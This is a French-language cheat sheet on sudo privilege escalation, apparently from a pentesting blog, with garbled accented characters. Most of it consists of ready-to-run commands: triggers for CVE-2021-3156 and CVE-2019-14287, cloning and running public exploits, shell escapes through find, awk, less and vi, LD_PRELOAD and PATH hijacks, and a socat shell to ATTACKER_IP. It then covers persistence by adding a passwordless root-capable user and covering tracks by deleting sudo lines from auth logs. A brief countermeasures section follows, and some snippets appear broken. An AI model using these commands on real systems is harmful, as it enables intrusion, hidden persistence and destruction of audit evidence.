---
title: Sudo Exploit
date: "2025-07-15"
draft: false
---

# üîß Sudo Exploit - Cheat Sheet

## üéØ Vue d'ensemble
Les exploits Sudo permettent d'escalader les privil√®ges en exploitant des vuln√©rabilit√©s dans la configuration ou l'impl√©mentation de sudo, permettant d'ex√©cuter des commandes avec des privil√®ges √©lev√©s.

---

## üîç D√©tection et √ânum√©ration

### V√©rification des Privil√®ges Sudo
```bash
# V√©rification des privil√®ges sudo actuels
# Pourquoi : Comprendre les permissions sudo de l'utilisateur actuel
sudo -l
sudo -ll
sudo -U username -l

# V√©rification de la configuration sudo
# Pourquoi : Examiner la configuration sudo du syst√®me
sudo cat /etc/sudoers
sudo cat /etc/sudoers.d/*
sudo visudo -c
```

### √ânum√©ration des Vuln√©rabilit√©s
```bash
# V√©rification de la version de sudo
# Pourquoi : Identifier les vuln√©rabilit√©s connues dans la version
sudo --version
dpkg -l | grep sudo
rpm -qa | grep sudo

# Recherche de configurations dangereuses
# Pourquoi : Identifier les configurations sudo vuln√©rables
grep -r "NOPASSWD" /etc/sudoers*
grep -r "ALL" /etc/sudoers*
grep -r "root" /etc/sudoers*
```

---

## üõ†Ô∏è Types d'Exploits Sudo

### Vuln√©rabilit√©s de Version
```bash
# CVE-2021-3156 (Baron Samedit)
# Pourquoi : Vuln√©rabilit√© de d√©bordement de buffer dans sudo
# Versions affect√©es: sudo < 1.9.5p2
# Test de vuln√©rabilit√©
sudoedit -s '\' `perl -e 'print "A" x 65536'`

# CVE-2019-14287
# Pourquoi : Vuln√©rabilit√© permettant de contourner les restrictions
# Versions affect√©es: sudo < 1.8.28
sudo -u#-1 id
sudo -u#4294967295 id
```

### Vuln√©rabilit√©s de Configuration
```bash
# Sudo sans mot de passe
# Pourquoi : Ex√©cuter des commandes sudo sans authentification
sudo -n whoami
sudo -n /bin/bash

# Sudo avec commandes sp√©cifiques
# Pourquoi : Exploiter des commandes autoris√©es pour l'escalade
sudo find /etc/passwd -exec /bin/bash \;
sudo awk 'BEGIN {system("/bin/bash")}'
sudo less /etc/passwd
# Dans less: !/bin/bash
```

---

## üéØ Techniques d'Exploitation

### Exploitation de CVE-2021-3156
```bash
# Compilation de l'exploit
# Pourquoi : Compiler l'exploit pour la vuln√©rabilit√© Baron Samedit
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make

# Ex√©cution de l'exploit
# Pourquoi : Exploiter la vuln√©rabilit√© pour obtenir un shell root
./sudo-hax-me-a-sandwich
./exploit

# Exploit alternatif
# Pourquoi : Alternative si le premier exploit ne fonctionne pas
git clone https://github.com/worawit/CVE-2021-3156.git
cd CVE-2021-3156
make
./exploit
```

### Exploitation de CVE-2019-14287
```bash
# Test de la vuln√©rabilit√©
# Pourquoi : V√©rifier si le syst√®me est vuln√©rable
sudo -u#-1 whoami
sudo -u#4294967295 whoami

# Exploitation pour obtenir un shell
# Pourquoi : Obtenir un shell root via la vuln√©rabilit√©
sudo -u#-1 /bin/bash
sudo -u#4294967295 /bin/bash
```

### Exploitation de Configurations
```bash
# Sudo avec find
# Pourquoi : Utiliser find pour ex√©cuter des commandes arbitraires
sudo find /etc/passwd -exec /bin/bash \;
sudo find /etc/passwd -exec /bin/sh \;

# Sudo avec awk
# Pourquoi : Utiliser awk pour ex√©cuter des commandes syst√®me
sudo awk 'BEGIN {system("/bin/bash")}'
sudo awk 'BEGIN {system("/bin/sh")}'

# Sudo avec less/more
# Pourquoi : Utiliser les pagers pour ex√©cuter des commandes
sudo less /etc/passwd
# Dans less: !/bin/bash
sudo more /etc/passwd
# Dans more: !/bin/bash
```

---

## üîß Techniques Avanc√©es

### Exploitation de Variables d'Environnement
```bash
# Sudo avec LD_PRELOAD
# Pourquoi : Utiliser LD_PRELOAD pour injecter du code malveillant
echo 'int __libc_start_main(int (*main) (int, char **, char **), int argc, char **argv, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (*stack_end)) { system("/bin/bash"); }' > /tmp/preload.c
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c
sudo LD_PRELOAD=/tmp/preload.so whoami
```

### Exploitation de Path
```bash
# Sudo avec PATH modifi√©
# Pourquoi : Modifier le PATH pour ex√©cuter des commandes malveillantes
echo 'int main() { setuid(0); system("/bin/bash"); }' > /tmp/bash.c
gcc -o /tmp/bash /tmp/bash.c
sudo PATH=/tmp:$PATH whoami
```

### Exploitation de Sudoers
```bash
# Recherche de configurations vuln√©rables
# Pourquoi : Identifier des configurations sudo dangereuses
grep -r "NOPASSWD.*ALL" /etc/sudoers*
grep -r "ALL.*NOPASSWD" /etc/sudoers*

# Exploitation de wildcards
# Pourquoi : Exploiter les wildcards dans les configurations sudo
sudo /usr/bin/vi /etc/passwd
# Dans vi: :!/bin/bash
```

---

## üîç Post-Exploitation

### Stabilisation du Shell
```bash
# Am√©lioration du shell
# Pourquoi : Obtenir un shell interactif avec historique et autocompl√©tion
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Avec socat
# Pourquoi : Alternative plus robuste pour les shells
socat file:`tty`,raw,echo=0 tcp:ATTACKER_IP:4444
```

### Persistance
```bash
# Ajout d'un utilisateur avec privil√®ges sudo
# Pourquoi : Cr√©er un utilisateur persistant avec des privil√®ges sudo
useradd -m -s /bin/bash eviluser
echo "eviluser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
passwd eviluser

# Modification du mot de passe root
# Pourquoi : Changer le mot de passe root pour maintenir l'acc√®s
passwd root
```

### Nettoyage
```bash
# Suppression des fichiers d'exploit
# Pourquoi : Nettoyer les traces de l'exploitation
rm -rf /tmp/preload.c /tmp/preload.so
rm -rf /tmp/bash.c /tmp/bash
rm -rf /tmp/exploit*

# Modification des logs
# Pourquoi : Supprimer les traces dans les logs
sed -i '/sudo/d' /var/log/auth.log
sed -i '/sudo/d' /var/log/secure
```

---

## üõ°Ô∏è Contre-Mesures

### D√©tection
```bash
# Surveillance des commandes sudo
# Pourquoi : D√©tecter les utilisations suspectes de sudo
tail -f /var/log/auth.log | grep sudo
tail -f /var/log/secure | grep sudo

# Surveillance des fichiers d'exploit
# Pourquoi : D√©tecter les fichiers d'exploit communs
find /tmp -name "*exploit*" -o -name "*preload*" -o -name "*hax*"
```

### Mitigation
```bash
# Mise √† jour de sudo
# Pourquoi : Installer les derni√®res versions de sudo
apt update && apt upgrade sudo
yum update sudo

# Configuration s√©curis√©e
# Pourquoi : Configurer sudo de mani√®re s√©curis√©e
# √âviter NOPASSWD, limiter les commandes autoris√©es
# Utiliser des groupes sp√©cifiques au lieu de ALL
```

### Configuration S√©curis√©e
```bash
# Exemple de configuration sudo s√©curis√©e
# Pourquoi : Configurer sudo avec des permissions minimales
# user ALL=(ALL) /usr/bin/apt, /usr/bin/dpkg
# user ALL=(ALL) /usr/bin/systemctl restart apache2
# √âviter: user ALL=(ALL) NOPASSWD: ALL
```

---

## üìö Ressources

- **CVE-2021-3156** : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-3156
- **CVE-2019-14287** : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287
- **HackTricks Sudo** : https://book.hacktricks.xyz/linux-hardening/privilege-escalation/sudo
- **GTFOBins** : https://gtfobins.github.io/

---

_Derni√®re mise √† jour : 15 juillet 2025_
